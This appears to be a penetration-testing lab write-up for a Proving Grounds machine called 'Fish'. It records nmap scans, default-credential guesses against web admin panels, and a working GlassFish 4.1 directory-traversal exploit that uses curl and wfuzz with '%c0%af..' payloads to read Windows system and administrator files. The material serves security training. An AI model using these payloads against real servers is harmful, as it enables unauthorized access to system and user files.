# Fish

# Enumeration

## nmap
```
# Nmap 7.91 scan initiated Sun Feb 13 09:17:03 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Fish/results/192.168.161.168/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Fish/results/192.168.161.168/scans/xml/_full_tcp_nmap.xml" 192.168.161.168
Nmap scan report for 192.168.161.168
Host is up, received user-set (0.18s latency).
Scanned at 2022-02-13 09:17:04 EST for 1293s
Not shown: 65525 filtered ports
Reason: 65525 no-responses
PORT      STATE SERVICE        REASON          VERSION
3389/tcp  open  ms-wbt-server? syn-ack ttl 127
3700/tcp  open  lrs-paging?    syn-ack ttl 127
4848/tcp  open  appserv-http?  syn-ack ttl 127
6060/tcp  open  x11?           syn-ack ttl 127
7676/tcp  open  imqbrokerd?    syn-ack ttl 127
7680/tcp  open  pando-pub?     syn-ack ttl 127
8080/tcp  open  http-proxy?    syn-ack ttl 127
8181/tcp  open  intermapper?   syn-ack ttl 127
8686/tcp  open  sun-as-jmxrmi? syn-ack ttl 127
49694/tcp open  unknown        syn-ack ttl 127
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), Microsoft Windows XP (86%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:freebsd:freebsd:6.2
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP3 (86%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/13%OT=3389%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=620917ED%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=109%TI=I%TS=U)
OPS(O1=M54ENW0NNS%O2=M54ENW0NNS%O3=M54ENW0%O4=M54ENW0NNS%O5=M54ENW0NNS%O6=M54ENNS)
WIN(W1=FA00%W2=FA00%W3=FA00%W4=FA00%W5=FA00%W6=FA00)
ECN(R=Y%DF=Y%TG=80%W=FA00%O=M54ENW0NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   182.87 ms 192.168.49.1
2   182.88 ms 192.168.161.168

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 13 09:38:37 2022 -- 1 IP address (1 host up) scanned in 1294.62 seconds
```

## nmap UDP

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Fish]
└─$ sudo nmap -p- -sU 192.168.161.168 -oN udp_full.txt                                                                                                            130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-13 09:59 EST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.16 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Fish]
└─$ 
┌──(kali㉿kali)-[/tmp]
└─$ sudo nmap -p- -sU 192.168.90.168 -Pn                                                                                                                            1 ⨯
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-14 01:24 EST
Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 5.49% done; ETC: 05:03 (3:27:01 remaining)
Stats: 2:15:31 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 61.95% done; ETC: 05:02 (1:23:14 remaining)
Stats: 3:17:43 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 90.39% done; ETC: 05:02 (0:21:02 remaining)
Nmap scan report for 192.168.90.168
Host is up.
All 65535 scanned ports on 192.168.90.168 are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 13125.73 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

## 3389/tcp  open  ms-wbt-server? syn-ack ttl 127

```
┌──(kali㉿kali)-[~]
└─$ curl 192.168.90.168:3389 -v
*   Trying 192.168.90.168:3389...
* Connected to 192.168.90.168 (192.168.90.168) port 3389 (#0)
> GET / HTTP/1.1
> Host: 192.168.90.168:3389
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Recv failure: Connection reset by peer
* Closing connection 0
curl: (56) Recv failure: Connection reset by peer
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```


## 3700/tcp  open  lrs-paging?    syn-ack ttl 127
https://www.speedguide.net/port.php?port=3700
  
Portal of Doom (coded in Visual Basic, 03.1999) is a popular remote access trojan that uses ports 3700/tcp, 9872-9875/tcp, 10067/udp, 10167/udp.  
  
3700/tcp is also registered with IANA for: LRS NetPage

## Web Testing

![](Pasted%20image%2020220214145011.png)


## 4848/tcp  open  appserv-http?  syn-ack ttl 127

https://www.speedguide.net/port.php?port=4848

App Server - Admin HTTP  
  
An issue was discovered in Epikur before 20.1.1. A Glassfish 4.1 server with a default configuration is running on TCP port 4848. No password is required to access it with the administrator account.  
References: [[CVE-2020-10537](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10537 "CVE-2020-10537")]

![](Pasted%20image%2020220214144023.png)

![](Pasted%20image%2020220214144107.png)


### Credentials Testing

Failed

```
admin:admin
arthur:arthur
admin:password
admin:KingOfAtlantis
arthur:KingOfAtlantis
```

trying `admin:` (default credentials) https://javaee.github.io/tutorial/usingexamples002.html

![](Pasted%20image%2020220214174447.png)

## 6060/tcp  open  x11?           syn-ack ttl 127

### Web Testing
![](Pasted%20image%2020220214144846.png)

https://www.google.com/search?q=Synaman+4.0+exploit&sxsrf=APq-WBsh5iBZvRGj-dTz-CC8lVJzjzyGtw%3A1644821352625&ei=aPsJYuu-JZ_mz7sP392boAw&ved=0ahUKEwjrksSDzf71AhUf83MBHd_uBsQQ4dUDCA8&uact=5&oq=Synaman+4.0+exploit&gs_lcp=Cgdnd3Mtd2l6EAM6CAgAEIAEELADOgcIABCwAxAeOgYIABAWEB5KBAhBGAFKBAhGGABQkQVY6xRgvxZoAXAAeACAAc4BiAH7BJIBBTcuMC4xmAEAoAEByAECwAEB&sclient=gws-wiz
- https://www.exploit-db.com/exploits/45387

### Credentials Testing

Failed
```
admin:admin
admin:password
synaman:synaman
```

## 7676/tcp  open  imqbrokerd?    syn-ack ttl 127

![](Pasted%20image%2020220214145216.png)

## 7680/tcp  open  pando-pub?     syn-ack ttl 127

## 8080/tcp  open  http-proxy?    syn-ack ttl 127

## 8181/tcp  open  intermapper?   syn-ack ttl 127

## 8686/tcp  open  sun-as-jmxrmi? syn-ack ttl 127

## 49694/tcp open  unknown        syn-ack ttl 127


# Exploitation

## Glassfish CVE

https://www.google.com/search?q=Glassfish+server+open+source+edition+4.1+exploit&biw=1358&bih=588&sxsrf=APq-WBuo9DzuawUxC7lyYvPjMHFIPZN0Iw%3A1644820883048&ei=k_kJYs-dAozA3LUP_PezqAk&ved=0ahUKEwiPs8-jy_71AhUMILcAHfz7DJUQ4dUDCA8&uact=5&oq=Glassfish+server+open+source+edition+4.1+exploit&gs_lcp=Cgdnd3Mtd2l6EAMyBggAEAcQHjIGCAAQBxAeOgcIABBHELADSgQIQRgASgQIRhgAUOIGWIoIYIYJaAFwAXgAgAFYiAGdAZIBATKYAQCgAQHIAQjAAQE&sclient=gws-wiz
- https://www.exploit-db.com/exploits/39441

```
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/system32/cmd.exe' > /tmp/cmd.exe 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  283k    0  283k    0     0  58805      0 --:--:--  0:00:04 --:--:-- 77754
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ file cmd.exe      
cmd.exe: cannot open `cmd.exe' (No such file or directory)
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ file /tmp/cmd.exe
/tmp/cmd.exe: PE32+ executable (console) x86-64, for MS Windows
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

```
┌──(kali㉿kali)-[~]
└─$ wfuzz --hh 0 -c -w windows-lfi.txt 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afFUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afFUZZ
Total requests: 6611

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000000001:   200        7 L      12 W       92 Ch       "windows/win.ini"                                                                                      
000000003:   404        0 L      55 W       1082 Ch     "$SysReset/AppxLogs/RestoreDownlevelAllUserStore.log"                                                  
000000007:   404        0 L      55 W       1082 Ch     "$SysReset/Logs/setupact.log"                                                                          
000000015:   404        0 L      55 W       1082 Ch     "apache/log/error.log"                                                                                 
000000020:   404        0 L      55 W       1082 Ch     "apache/php/php.ini"                                                                                   
000000019:   404        0 L      55 W       1082 Ch     "apache/logs/error.log"                                                                                
000000018:   404        0 L      55 W       1082 Ch     "apache/logs/error_log"  
```

```
┌──(kali㉿kali)-[~]
└─$ wfuzz --hc 404 -c -w windows-lfi.txt 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afFUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afFUZZ
Total requests: 6611

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000000001:   200        7 L      12 W       92 Ch       "windows/win.ini"                                                                                      
000000032:   200        2 L      10 W       20 Ch       "documents and settings/administrator/ntuser.ini"                                                      
000000030:   200        4 L      9 W        282 Ch      "documents and settings/administrator/desktop/desktop.ini"                                             
000000031:   200        3483 L   25908 W    1304916 C   "documents and settings/administrator/ntuser.dat"                                                      
                                            h                                                                                                                  
000000188:   200        415 L    2783 W     19626 Ch    "Program Files (x86)/Common Files/Microsoft Shared/ink/ThirdPartyNotices.MSHWLatin.txt"                
000000274:   200        10 L     11 W       438 Ch      "Program Files (x86)/Microsoft/Edge/Application/msedge.VisualElementsManifest.xml"                     
000000269:   200        52 L     407 W      8218 Ch     "Program Files (x86)/Microsoft.NET/RedistList/AssemblyList_4_extended.xml"                             
000000268:   200        99 L     783 W      15713 Ch    "Program Files (x86)/Microsoft.NET/RedistList/AssemblyList_4_client.xml"                               
000000336:   200        7 L      29 W       241 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Mod
                                                        ules/Example1.Diagnostics/Diagnostics/Simple/Example1.Diagnostics.Tests.ps1"                           
000000335:   200        103 L    390 W      5046 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Mic
                                                        rosoft.PowerShell.Operation.Validation.Tests.ps1"                                                      
000000334:   200        9 L      40 W       384 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Diagnost
                                                        ics/Simple/Simple.Tests.ps1"                                                                           
000000333:   200        21 L     82 W       759 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Diagnost
                                                        ics/Comprehensive/Comprehensive.Tests.ps1"                                                             
000000332:   200        1769 L   4706 W     45170 Ch    "Program Files (x86)/Windows NT/TableTextService/TableTextServiceYi.txt"                               
000000331:   200        448 L    2324 W     14198 Ch    "Program Files (x86)/Windows NT/TableTextService/TableTextServiceTigrinya.txt"                         
000000328:   200        164 L    173 W      6363 Ch     "Program Files (x86)/Windows Media Player/Media Renderer/RenderingControl.xml"                         
000000327:   200        64 L     70 W       2355 Ch     "Program Files (x86)/Windows Media Player/Media Renderer/RenderingControl_DMP.xml"                     
000000326:   200        132 L    145 W      5428 Ch     "Program Files (x86)/Windows Media Player/Media Renderer/connectionmanager_dmr.xml"                    
000000325:   200        499 L    532 W      20699 Ch    "Program Files (x86)/Windows Media Player/Media Renderer/avtransport.xml"                              
000000337:   200        7 L      29 W       241 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Mod
                                                        ules/Example2.Diagnostics/1.0.1/Diagnostics/Simple/Example2.Diagnostics.Tests.ps1"                     
000000339:   200        7 L      29 W       241 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Mod
                                                        ules/Example3.Diagnostics/2.0.1/Diagnostics/Simple/Example3B.Diagnostics.Tests.ps1"                    
000000342:   200        157 L    404 W      5076 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/chocolateyInstall.ps1"                     
000000343:   200        73 L     443 W      3110 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_BeforeEach_AfterEach.help.txt" 
000000341:   200        53 L     155 W      1536 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/build.psake.ps1"                           
000000338:   200        7 L      29 W       241 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Mod
                                                        ules/Example3.Diagnostics/1.1.1/Diagnostics/Simple/Example3A.Diagnostics.Tests.ps1"                    
000000340:   200        487 L    575 W      16479 Ch    "Program Files (x86)/WindowsPowerShell/Modules/PackageManagement/1.0.0.1/PackageManagement.format.ps1xm
                                                        l"                                                                                                     
000000344:   200        188 L    883 W      6396 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_Mocking.help.txt"              
000000346:   200        148 L    837 W      5945 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_should.help.txt"               
000000350:   200        36 L     88 W       822 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Examples/Validator/Validator.Tests.ps1"    
000000358:   200        17 L     63 W       489 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLike.Tests.ps1"     
000000371:   200        13 L     36 W       387 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Match.ps1"            
000000370:   200        36 L     106 W      999 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Exist.Tests.ps1"      
000000369:   200        12 L     30 W       289 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Exist.ps1"            
000000368:   200        20 L     85 W       859 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/ContainExactly.Tests.p
                                                        s1"                                                                                                    
000000367:   200        12 L     43 W       490 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/ContainExactly.ps1"   
000000366:   200        25 L     101 W      998 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Contain.Tests.ps1"    
000000365:   200        13 L     41 W       454 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Contain.ps1"          
000000364:   200        20 L     72 W       691 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeOfType.Tests.ps1"   
000000363:   200        30 L     162 W      1395 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeOfType.ps1"         
000000362:   200        17 L     46 W       474 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeNullOrEmpty.Tests.ps
                                                        1"                                                                                                     
000000361:   200        23 L     61 W       579 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeNullOrEmpty.ps1"    
000000360:   200        17 L     63 W       508 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLikeExactly.Tests.ps
                                                        1"                                                                                                     
000000357:   200        13 L     38 W       389 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLike.ps1"           
000000359:   200        13 L     40 W       413 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLikeExactly.ps1"    
000000356:   200        17 L     53 W       494 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLessThan.Tests.ps1" 
000000355:   200        14 L     36 W       365 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLessThan.ps1"       
000000330:   200        28077    61811 W    980224 Ch   "Program Files (x86)/Windows NT/TableTextService/TableTextServiceDaYi.txt"                             
                        L                                                                                                                                      
000000354:   200        18 L     53 W       511 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeGreaterThan.Tests.ps
                                                        1"                                                                                                     
000000353:   200        14 L     36 W       374 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeGreaterThan.ps1"    
000000352:   200        76 L     417 W      3455 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Be.Tests.ps1"         
000000349:   200        26 L     86 W       606 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Examples/Calculator/Add-Numbers.Tests.ps1" 
000000351:   200        115 L    412 W      4129 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Be.ps1"               
000000348:   200        3 L      9 W        55 Ch       "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Examples/Calculator/Add-Numbers.ps1"       
000000345:   200        141 L    685 W      5056 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_Pester.help.txt"               
000000347:   200        40 L     156 W      1156 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_TestDrive.help.txt"            
000000372:   200        21 L     74 W       587 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Match.Tests.ps1"      
000000374:   200        17 L     60 W       503 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/MatchExactly.Tests.ps1
                                                        "                                                                                                      
000000378:   200        96 L     280 W      3239 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Should.ps1"           
000000386:   200        127 L    462 W      4089 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Describe.ps1"                    
000000402:   200        471 L    1319 W     14093 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/SetupTeardown.ps1"               
000000401:   200        405 L    1375 W     14444 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/PesterState.Tests.ps1"           
000000403:   200        186 L    629 W      5571 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/SetupTeardown.Tests.ps1"         
000000400:   200        543 L    1359 W     19397 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/PesterState.ps1"                 
000000399:   200        88 L     334 W      3202 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/New-Fixture.Tests.ps1"           
000000398:   200        107 L    388 W      3311 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/New-Fixture.ps1"                 
000000397:   200        1673 L   6284 W     59679 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Mock.Tests.ps1"                  
000000396:   200        1411 L   4700 W     48974 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Mock.ps1"                        
000000395:   200        242 L    1104 W     9754 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/It.Tests.ps1"                    
000000394:   200        402 L    1240 W     11944 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/It.ps1"                          
000000393:   200        44 L     211 W      1608 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/InModuleScope.Tests.ps1"         
000000392:   200        132 L    412 W      3905 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/InModuleScope.ps1"               
000000391:   200        18 L     59 W       554 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/In.Tests.ps1"                    
000000390:   200        35 L     115 W      821 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/In.ps1"                          
000000389:   200        23 L     88 W       732 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/GlobalMock-B.Tests.ps1"          
000000388:   200        30 L     96 W       761 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/GlobalMock-A.Tests.ps1"          
000000387:   200        19 L     90 W       761 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Describe.Tests.ps1"              
000000385:   200        305 L    1042 W     11436 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Coverage.Tests.ps1"              
000000384:   200        576 L    1524 W     17753 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Coverage.ps1"                    
000000383:   200        19 L     90 W       758 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Context.Tests.ps1"               
000000382:   200        85 L     270 W      2337 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Context.ps1"                     
000000381:   200        14 L     77 W       457 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/BreakAndContinue.Tests.ps1"      
000000380:   200        13 L     33 W       281 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Test-Assertion.ps1"   
000000377:   200        22 L     94 W       1013 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Set-TestInconclusive.p
                                                        s1"                                                                                                    
000000379:   200        162 L    594 W      5407 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Should.Tests.ps1"     
000000376:   200        97 L     520 W      4928 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/PesterThrow.Tests.ps1"
000000373:   200        13 L     38 W       425 Ch      "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/MatchExactly.ps1"     
000000375:   200        53 L     237 W      2291 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/PesterThrow.ps1"      
000000404:   200        117 L    385 W      3850 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestDrive.ps1"                   
000000406:   200        462 L    1128 W     16435 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestResults.ps1"                 
000000410:   200        190 L    193 W      8251 Ch     "Program Files (x86)/WindowsPowerShell/Modules/PowerShellGet/1.0.0.1/PSGet.Format.ps1xml"              
000000428:   200        3 L      9 W        215 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/insert.xml"                             
000000427:   200        20 L     89 W       1434 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/auxpad/auxbase.xml"                     
000000426:   200        3 L      10 W       212 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/auxpad.xml"                             
000000425:   200        430 L    1618 W     27045 Ch    "Program Files/Common Files/microsoft shared/ink/Content.xml"                                          
000000409:   200        285 L    1085 W     11155 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Pester.Tests.ps1"                          
000000408:   200        177 L    798 W      6698 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestsRunningInCleanRunspace.Tests
                                                        .ps1"                                                                                                  
000000405:   200        163 L    525 W      4180 Ch     "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestDrive.Tests.ps1"             
000000407:   200        575 L    1995 W     27623 Ch    "Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestResults.Tests.ps1"           
000000429:   200        15 L     60 W       903 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/insert/insertbase.xml"                  
000000431:   200        5 L      19 W       382 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/keypad/ea.xml"                          
000000435:   200        46 L     256 W      3524 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_altgr.xml"                    
000000443:   200        216 L    1209 W     16102 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/ja-jp.xml"                         
000000458:   200        13 L     36 W       591 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/symbols.xml"                            
000000459:   200        11 L     47 W       680 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/symbols/ea-sym.xml"                     
000000457:   200        13 L     59 W       922 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskpred/oskpredbase.xml"                
000000456:   200        3 L      10 W       215 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskpred.xml"                            
000000455:   200        35 L     146 W      1851 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/osknumpad/osknumpadbase.xml"            
000000454:   200        3 L      10 W       219 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/osknumpad.xml"                          
000000453:   200        17 L     75 W       1067 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/osknav/osknavbase.xml"                  
000000452:   200        3 L      10 W       213 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/osknav.xml"                             
000000451:   200        6 L      25 W       469 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskmenu/oskmenubase.xml"                
000000450:   200        3 L      10 W       215 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskmenu.xml"                            
000000449:   200        10 L     44 W       735 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskclearui/oskclearuibase.xml"          
000000448:   200        3 L      10 W       221 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskclearui.xml"                         
000000447:   200        212 L    1001 W     10633 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/zh-phonetic.xml"                   
000000446:   200        212 L    1029 W     10697 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/zh-dayi.xml"                       
000000445:   200        212 L    941 W      9593 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/zh-changjei.xml"                   
000000442:   200        2 L      9 W        247 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/baseAltGr_rtl.xml"                 
000000444:   200        199 L    1179 W     14833 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/ko-kr.xml"                         
000000441:   200        46 L     234 W      3333 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base.xml"                          
000000440:   200        19 L     45 W       617 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_rtl.xml"                      
000000439:   200        6 L      27 W       480 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_kor.xml"                      
